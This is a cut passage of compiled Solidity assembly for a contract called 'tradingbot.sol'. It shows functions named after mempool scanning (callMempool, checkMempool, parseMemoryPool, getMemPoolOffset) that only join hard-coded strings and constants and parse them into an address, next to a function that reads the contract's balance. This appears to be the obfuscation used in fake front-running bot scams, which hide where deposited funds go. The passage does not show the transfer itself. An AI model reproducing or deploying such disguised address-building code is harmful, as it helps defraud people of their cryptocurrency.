dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":8275:8287  _allMempools */\n      dup4\n        /* \"contracts/tradingbot.sol\":8262:8269  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":8262:8288  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_70:\n        /* \"contracts/tradingbot.sol\":8233:8288  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":8308:8320  _fullMempool */\n      dup1\n        /* \"contracts/tradingbot.sol\":8301:8320  return _fullMempool */\n      swap15\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":7268:8328  function callMempool() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":4475:5415  function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {... */\n    tag_25:\n        /* \"contracts/tradingbot.sol\":4541:4556  address _parsed */\n      0x00\n        /* \"contracts/tradingbot.sol\":4569:4585  bytes memory tmp */\n      dup1\n        /* \"contracts/tradingbot.sol\":4594:4596  _a */\n      dup3\n        /* \"contracts/tradingbot.sol\":4569:4597  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":4608:4621  uint160 iaddr */\n      0x00\n        /* \"contracts/tradingbot.sol\":4636:4646  uint160 b1 */\n      dup1\n        /* \"contracts/tradingbot.sol\":4657:4667  uint160 b2 */\n      dup1\n        /* \"contracts/tradingbot.sol\":4683:4689  uint i */\n      0x00\n        /* \"contracts/tradingbot.sol\":4692:4693  2 */\n      0x02\n        /* \"contracts/tradingbot.sol\":4683:4693  uint i = 2 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":4678:5376  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_72:\n        /* \"contracts/tradingbot.sol\":4699:4709  2 + 2 * 20 */\n      0x2a\n        /* \"contracts/tradingbot.sol\":4695:4696  i */\n      dup2\n        /* \"contracts/tradingbot.sol\":4695:4709  i < 2 + 2 * 20 */\n      lt\n        /* \"contracts/tradingbot.sol\":4678:5376  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_73\n      jumpi\n        /* \"contracts/tradingbot.sol\":4743:4746  256 */\n      0x0100\n        /* \"contracts/tradingbot.sol\":4734:4746  iaddr *= 256 */\n      dup5\n      tag_75\n      swap2\n      swap1\n      tag_76\n      jump\t// in\n    tag_75:\n      swap4\n      pop\n        /* \"contracts/tradingbot.sol\":4780:4783  tmp */\n      dup5\n        /* \"contracts/tradingbot.sol\":4784:4785  i */\n      dup2\n        /* \"contracts/tradingbot.sol\":4780:4786  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_77\n      jumpi\n      tag_78\n      tag_79\n      jump\t// in\n    tag_78:\n    tag_77:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":4774:4787  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"contracts/tradingbot.sol\":4766:4788  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"contracts/tradingbot.sol\":4761:4788  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":4822:4825  tmp */\n      dup5\n        /* \"contracts/tradingbot.sol\":4830:4831  1 */\n      0x01\n        /* \"contracts/tradingbot.sol\":4826:4827  i */\n      dup3\n        /* \"contracts/tradingbot.sol\":4826:4831  i + 1 */\n      tag_80\n      swap2\n      swap1\n      tag_81\n      jump\t// in\n    tag_80:\n        /* \"contracts/tradingbot.sol\":4822:4832  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_82\n      jumpi\n      tag_83\n      tag_79\n      jump\t// in\n    tag_83:\n    tag_82:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":4816:4833  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"contracts/tradingbot.sol\":4808:4834  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"contracts/tradingbot.sol\":4803:4834  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":4860:4862  97 */\n      0x61\n        /* \"contracts/tradingbot.sol\":4854:4856  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":4854:4862  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":4853:4878  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_84\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":4874:4877  102 */\n      0x66\n        /* \"contracts/tradingbot.sol\":4868:4870  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":4868:4877  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":4853:4878  (b1 >= 97) && (b1 <= 102) */\n    tag_84:\n        /* \"contracts/tradingbot.sol\":4849:5081  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_85\n      jumpi\n        /* \"contracts/tradingbot.sol\":4905:4907  87 */\n      0x57\n        /* \"contracts/tradingbot.sol\":4899:4907  b1 -= 87 */\n      dup4\n      tag_86\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_86:\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":4849:5081  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_88)\n    tag_85:\n        /* \"contracts/tradingbot.sol\":4940:4942  65 */\n      0x41\n        /* \"contracts/tradingbot.sol\":4934:4936  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":4934:4942  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":4933:4957  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_89\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":4954:4956  70 */\n      0x46\n        /* \"contracts/tradingbot.sol\":4948:4950  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":4948:4956  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":4933:4957  (b1 >= 65) && (b1 <= 70) */\n    tag_89:\n        /* \"contracts/tradingbot.sol\":4929:5081  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_90\n      jumpi\n        /* \"contracts/tradingbot.sol\":4984:4986  55 */\n      0x37\n        /* \"contracts/tradingbot.sol\":4978:4986  b1 -= 55 */\n      dup4\n      tag_91\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_91:\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":4929:5081  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_92)\n    tag_90:\n        /* \"contracts/tradingbot.sol\":5019:5021  48 */\n      0x30\n        /* \"contracts/tradingbot.sol\":5013:5015  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":5013:5021  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":5012:5036  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_93\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":5033:5035  57 */\n      0x39\n        /* \"contracts/tradingbot.sol\":5027:5029  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":5027:5035  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":5012:5036  (b1 >= 48) && (b1 <= 57) */\n    tag_93:\n        /* \"contracts/tradingbot.sol\":5008:5081  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_94\n      jumpi\n        /* \"contracts/tradingbot.sol\":5063:5065  48 */\n      0x30\n        /* \"contracts/tradingbot.sol\":5057:5065  b1 -= 48 */\n      dup4\n      tag_95\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_95:\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":5008:5081  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_94:\n        /* \"contracts/tradingbot.sol\":4929:5081  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_92:\n        /* \"contracts/tradingbot.sol\":4849:5081  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_88:\n        /* \"contracts/tradingbot.sol\":5106:5108  97 */\n      0x61\n        /* \"contracts/tradingbot.sol\":5100:5102  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5100:5108  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":5099:5124  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_96\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":5120:5123  102 */\n      0x66\n        /* \"contracts/tradingbot.sol\":5114:5116  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5114:5123  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":5099:5124  (b2 >= 97) && (b2 <= 102) */\n    tag_96:\n        /* \"contracts/tradingbot.sol\":5095:5327  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_97\n      jumpi\n        /* \"contracts/tradingbot.sol\":5151:5153  87 */\n      0x57\n        /* \"contracts/tradingbot.sol\":5145:5153  b2 -= 87 */\n      dup3\n      tag_98\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_98:\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":5095:5327  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_99)\n    tag_97:\n        /* \"contracts/tradingbot.sol\":5186:5188  65 */\n      0x41\n        /* \"contracts/tradingbot.sol\":5180:5182  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5180:5188  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":5179:5203  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_100\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":5200:5202  70 */\n      0x46\n        /* \"contracts/tradingbot.sol\":5194:5196  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5194:5202  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":5179:5203  (b2 >= 65) && (b2 <= 70) */\n    tag_100:\n        /* \"contracts/tradingbot.sol\":5175:5327  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_101\n      jumpi\n        /* \"contracts/tradingbot.sol\":5230:5232  55 */\n      0x37\n        /* \"contracts/tradingbot.sol\":5224:5232  b2 -= 55 */\n      dup3\n      tag_102\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_102:\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":5175:5327  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_103)\n    tag_101:\n        /* \"contracts/tradingbot.sol\":5265:5267  48 */\n      0x30\n        /* \"contracts/tradingbot.sol\":5259:5261  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5259:5267  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":5258:5282  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_104\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":5279:5281  57 */\n      0x39\n        /* \"contracts/tradingbot.sol\":5273:5275  b2 */\n      dup3\n        /* \"contracts/tradingbot.sol\":5273:5281  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":5258:5282  (b2 >= 48) && (b2 <= 57) */\n    tag_104:\n        /* \"contracts/tradingbot.sol\":5254:5327  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_105\n      jumpi\n        /* \"contracts/tradingbot.sol\":5309:5311  48 */\n      0x30\n        /* \"contracts/tradingbot.sol\":5303:5311  b2 -= 48 */\n      dup3\n      tag_106\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_106:\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":5254:5327  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_105:\n        /* \"contracts/tradingbot.sol\":5175:5327  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_103:\n        /* \"contracts/tradingbot.sol\":5095:5327  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_99:\n        /* \"contracts/tradingbot.sol\":5361:5363  b2 */\n      dup2\n        /* \"contracts/tradingbot.sol\":5356:5358  16 */\n      0x10\n        /* \"contracts/tradingbot.sol\":5351:5353  b1 */\n      dup5\n        /* \"contracts/tradingbot.sol\":5351:5358  b1 * 16 */\n      tag_107\n      swap2\n      swap1\n      tag_76\n      jump\t// in\n    tag_107:\n        /* \"contracts/tradingbot.sol\":5351:5363  b1 * 16 + b2 */\n      tag_108\n      swap2\n      swap1\n      tag_109\n      jump\t// in\n    tag_108:\n        /* \"contracts/tradingbot.sol\":5341:5364  iaddr += (b1 * 16 + b2) */\n      dup5\n      tag_110\n      swap2\n      swap1\n      tag_109\n      jump\t// in\n    tag_110:\n      swap4\n      pop\n        /* \"contracts/tradingbot.sol\":4716:4717  2 */\n      0x02\n        /* \"contracts/tradingbot.sol\":4711:4717  i += 2 */\n      dup2\n      tag_111\n      swap2\n      swap1\n      tag_81\n      jump\t// in\n    tag_111:\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":4678:5376  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_72)\n    tag_73:\n      pop\n        /* \"contracts/tradingbot.sol\":5401:5406  iaddr */\n      dup3\n        /* \"contracts/tradingbot.sol\":5386:5407  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":4475:5415  function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":10229:10366  function getLiquidity() internal view returns(uint) {... */\n    tag_27:\n        /* \"contracts/tradingbot.sol\":10275:10279  uint */\n      0x00\n        /* \"contracts/tradingbot.sol\":10337:10358  address(this).balance */\n      selfbalance\n        /* \"contracts/tradingbot.sol\":10330:10358  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10229:10366  function getLiquidity() internal view returns(uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":4211:4300  function getMemPoolOffset() internal pure returns (uint) {... */\n    tag_47:\n        /* \"contracts/tradingbot.sol\":4262:4266  uint */\n      0x00\n        /* \"contracts/tradingbot.sol\":4286:4292  314451 */\n      0x04cc53\n        /* \"contracts/tradingbot.sol\":4279:4292  return 314451 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":4211:4300  function getMemPoolOffset() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":5636:6650  function checkMempool(uint a) internal pure returns (string memory) {... */\n    tag_48:\n        /* \"contracts/tradingbot.sol\":5689:5702  string memory */\n      0x60\n        /* \"contracts/tradingbot.sol\":5715:5725  uint count */\n      0x00\n        /* \"contracts/tradingbot.sol\":5740:5746  uint b */\n      dup1\n        /* \"contracts/tradingbot.sol\":5749:5750  a */\n      dup4\n        /* \"contracts/tradingbot.sol\":5740:5750  uint b = a */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":5762:5834  while (b != 0) {... */\n    tag_115:\n        /* \"contracts/tradingbot.sol\":5774:5775  0 */\n      0x00\n        /* \"contracts/tradingbot.sol\":5769:5770  b */\n      dup2\n        /* \"contracts/tradingbot.sol\":5769:5775  b != 0 */\n      eq\n        /* \"contracts/tradingbot.sol\":5762:5834  while (b != 0) {... */\n      tag_116\n      jumpi\n        /* \"contracts/tradingbot.sol\":5792:5799  count++ */\n      dup2\n      dup1\n      tag_117\n      swap1\n      tag_118\n      jump\t// in\n    tag_117:\n      swap3\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":5819:5821  16 */\n      0x10\n        /* \"contracts/tradingbot.sol\":5814:5821  b /= 16 */\n      dup2\n      tag_119\n      swap2\n      swap1\n      tag_120\n      jump\t// in\n    tag_119:\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":5762:5834  while (b != 0) {... */\n      jump(tag_115)\n    tag_116:\n        /* \"contracts/tradingbot.sol\":5844:5860  bytes memory res */\n      0x00\n        /* \"contracts/tradingbot.sol\":5873:5878  count */\n      dup3\n        /* \"contracts/tradingbot.sol\":5863:5879  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_121\n      jumpi\n      tag_122\n      tag_123\n      jump\t// in\n    tag_122:\n    tag_121:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_124\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_124:\n      pop\n        /* \"contracts/tradingbot.sol\":5844:5879  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":5895:5901  uint i */\n      0x00\n        /* \"contracts/tradingbot.sol\":5890:6034  for (uint i=0; i<count; ++i) {... */\n    tag_125:\n        /* \"contracts/tradingbot.sol\":5907:5912  count */\n      dup4\n        /* \"contracts/tradingbot.sol\":5905:5906  i */\n      dup2\n        /* \"contracts/tradingbot.sol\":5905:5912  i<count */\n      lt\n        /* \"contracts/tradingbot.sol\":5890:6034  for (uint i=0; i<count; ++i) {... */\n      iszero\n      tag_126\n      jumpi\n        /* \"contracts/tradingbot.sol\":5942:5944  16 */\n      0x10\n        /* \"contracts/tradingbot.sol\":5938:5939  a */\n      dup7\n        /* \"contracts/tradingbot.sol\":5938:5944  a % 16 */\n      tag_128\n      swap2\n      swap1\n      tag_129\n      jump\t// in\n    tag_128:\n        /* \"contracts/tradingbot.sol\":5934:5944  b = a % 16 */\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":5980:6000  toHexDigit(uint8(b)) */\n      tag_130\n        /* \"contracts/tradingbot.sol\":5997:5998  b */\n      dup4\n        /* \"contracts/tradingbot.sol\":5980:5990  toHexDigit */\n      tag_131\n        /* \"contracts/tradingbot.sol\":5980:6000  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_130:\n        /* \"contracts/tradingbot.sol\":5959:5962  res */\n      dup3\n        /* \"contracts/tradingbot.sol\":5975:5976  1 */\n      0x01\n        /* \"contracts/tradingbot.sol\":5971:5972  i */\n      dup4\n        /* \"contracts/tradingbot.sol\":5963:5968  count */\n      dup8\n        /* \"contracts/tradingbot.sol\":5963:5972  count - i */\n      tag_132\n      swap2\n      swap1\n      tag_133\n      jump\t// in\n    tag_132:\n        /* \"contracts/tradingbot.sol\":5963:5976  count - i - 1 */\n      tag_134\n      swap2\n      swap1\n      tag_133\n      jump\t// in\n    tag_134:\n        /* \"contracts/tradingbot.sol\":5959:5977  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_135\n      jumpi\n      tag_136\n      tag_79\n      jump\t// in\n    tag_136:\n    tag_135:\n      0x20\n      add\n      add\n        /* \"contracts/tradingbot.sol\":5959:6000  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/tradingbot.sol\":6020:6022  16 */\n      0x10\n        /* \"contracts/tradingbot.sol\":6015:6022  a /= 16 */\n      dup7\n      tag_137\n      swap2\n      swap1\n      tag_120\n      jump\t// in\n    tag_137:\n      swap6\n      pop\n        /* \"contracts/tradingbot.sol\":5914:5917  ++i */\n      dup1\n      tag_138\n      swap1\n      tag_118\n      jump\t// in\n    tag_138:\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":5890:6034  for (uint i=0; i<count; ++i) {... */\n      jump(tag_125)\n    tag_126:\n      pop\n        /* \"contracts/tradingbot.sol\":6044:6058  uint hexLength */\n      0x00\n        /* \"contracts/tradingbot.sol\":6074:6077  res */\n      dup2\n        /* \"contracts/tradingbot.sol\":6061:6086  bytes(string(res)).length */\n      mload\n        /* \"contracts/tradingbot.sol\":6044:6086  uint hexLength = bytes(string(res)).length */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6114:6115  4 */\n      0x04\n        /* \"contracts/tradingbot.sol\":6101:6110  hexLength */\n      dup2\n        /* \"contracts/tradingbot.sol\":6101:6115  hexLength == 4 */\n      sub\n        /* \"contracts/tradingbot.sol\":6097:6612  if (hexLength == 4) {... */\n      tag_139\n      jumpi\n        /* \"contracts/tradingbot.sol\":6132:6152  string memory _hexC1 */\n      0x00\n        /* \"contracts/tradingbot.sol\":6155:6180  mempool(\"0\", string(res)) */\n      tag_140\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":6175:6178  res */\n      dup5\n        /* \"contracts/tradingbot.sol\":6155:6162  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":6155:6180  mempool(\"0\", string(res)) */\n      jump\t// in\n    tag_140:\n        /* \"contracts/tradingbot.sol\":6132:6180  string memory _hexC1 = mempool(\"0\", string(res)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6202:6208  _hexC1 */\n      dup1\n        /* \"contracts/tradingbot.sol\":6195:6208  return _hexC1 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_114)\n        /* \"contracts/tradingbot.sol\":6097:6612  if (hexLength == 4) {... */\n    tag_139:\n        /* \"contracts/tradingbot.sol\":6243:6244  3 */\n      0x03\n        /* \"contracts/tradingbot.sol\":6230:6239  hexLength */\n      dup2\n        /* \"contracts/tradingbot.sol\":6230:6244  hexLength == 3 */\n      sub\n        /* \"contracts/tradingbot.sol\":6226:6612  if (hexLength == 3) {... */\n      tag_142\n      jumpi\n        /* \"contracts/tradingbot.sol\":6261:6281  string memory _hexC2 */\n      0x00\n        /* \"contracts/tradingbot.sol\":6284:6309  mempool(\"0\", string(res)) */\n      tag_143\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":6304:6307  res */\n      dup5\n        /* \"contracts/tradingbot.sol\":6284:6291  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":6284:6309  mempool(\"0\", string(res)) */\n      jump\t// in\n    tag_143:\n        /* \"contracts/tradingbot.sol\":6261:6309  string memory _hexC2 = mempool(\"0\", string(res)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6331:6337  _hexC2 */\n      dup1\n        /* \"contracts/tradingbot.sol\":6324:6337  return _hexC2 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_114)\n        /* \"contracts/tradingbot.sol\":6226:6612  if (hexLength == 3) {... */\n    tag_142:\n        /* \"contracts/tradingbot.sol\":6372:6373  2 */\n      0x02\n        /* \"contracts/tradingbot.sol\":6359:6368  hexLength */\n      dup2\n        /* \"contracts/tradingbot.sol\":6359:6373  hexLength == 2 */\n      sub\n        /* \"contracts/tradingbot.sol\":6355:6612  if (hexLength == 2) {... */\n      tag_145\n      jumpi\n        /* \"contracts/tradingbot.sol\":6390:6410  string memory _hexC3 */\n      0x00\n        /* \"contracts/tradingbot.sol\":6413:6440  mempool(\"000\", string(res)) */\n      tag_146\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x03\n      dup2\n      mstore\n      0x20\n      add\n      0x3030300000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":6435:6438  res */\n      dup5\n        /* \"contracts/tradingbot.sol\":6413:6420  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":6413:6440  mempool(\"000\", string(res)) */\n      jump\t// in\n    tag_146:\n        /* \"contracts/tradingbot.sol\":6390:6440  string memory _hexC3 = mempool(\"000\", string(res)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6462:6468  _hexC3 */\n      dup1\n        /* \"contracts/tradingbot.sol\":6455:6468  return _hexC3 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_114)\n        /* \"contracts/tradingbot.sol\":6355:6612  if (hexLength == 2) {... */\n    tag_145:\n        /* \"contracts/tradingbot.sol\":6503:6504  1 */\n      0x01\n        /* \"contracts/tradingbot.sol\":6490:6499  hexLength */\n      dup2\n        /* \"contracts/tradingbot.sol\":6490:6504  hexLength == 1 */\n      sub\n        /* \"contracts/tradingbot.sol\":6486:6612  if (hexLength == 1) {... */\n      tag_148\n      jumpi\n        /* \"contracts/tradingbot.sol\":6521:6541  string memory _hexC4 */\n      0x00\n        /* \"contracts/tradingbot.sol\":6544:6572  mempool(\"0000\", string(res)) */\n      tag_149\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x3030303000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":6567:6570  res */\n      dup5\n        /* \"contracts/tradingbot.sol\":6544:6551  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":6544:6572  mempool(\"0000\", string(res)) */\n      jump\t// in\n    tag_149:\n        /* \"contracts/tradingbot.sol\":6521:6572  string memory _hexC4 = mempool(\"0000\", string(res)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6594:6600  _hexC4 */\n      dup1\n        /* \"contracts/tradingbot.sol\":6587:6600  return _hexC4 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_114)\n        /* \"contracts/tradingbot.sol\":6486:6612  if (hexLength == 1) {... */\n    tag_148:\n        /* \"contracts/tradingbot.sol\":6638:6641  res */\n      dup2\n        /* \"contracts/tradingbot.sol\":6624:6642  return string(res) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":5636:6650  function checkMempool(uint a) internal pure returns (string memory) {... */\n    tag_114:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":12328:12958  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n    tag_49:\n        /* \"contracts/tradingbot.sol\":12411:12424  string memory */\n      0x60\n        /* \"contracts/tradingbot.sol\":12437:12460  bytes memory _baseBytes */\n      0x00\n        /* \"contracts/tradingbot.sol\":12469:12474  _base */\n      dup4\n        /* \"contracts/tradingbot.sol\":12437:12475  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":12486:12510  bytes memory _valueBytes */\n      0x00\n        /* \"contracts/tradingbot.sol\":12519:12525  _value */\n      dup4\n        /* \"contracts/tradingbot.sol\":12486:12526  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":12539:12562  string memory _tmpValue */\n      0x00\n        /* \"contracts/tradingbot.sol\":12596:12607  _valueBytes */\n      dup2\n        /* \"contracts/tradingbot.sol\":12596:12614  _valueBytes.length */\n      mload\n        /* \"contracts/tradingbot.sol\":12576:12586  _baseBytes */\n      dup4\n        /* \"contracts/tradingbot.sol\":12576:12593  _baseBytes.length */\n      mload\n        /* \"contracts/tradingbot.sol\":12576:12614  _baseBytes.length + _valueBytes.length */\n      tag_151\n      swap2\n      swap1\n      tag_81\n      jump\t// in\n    tag_151:\n        /* \"contracts/tradingbot.sol\":12565:12615  new string(_baseBytes.length + _valueBytes.length) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_152\n      jumpi\n      tag_153\n      tag_123\n      jump\t// in\n    tag_153:\n    tag_152:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_154\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n   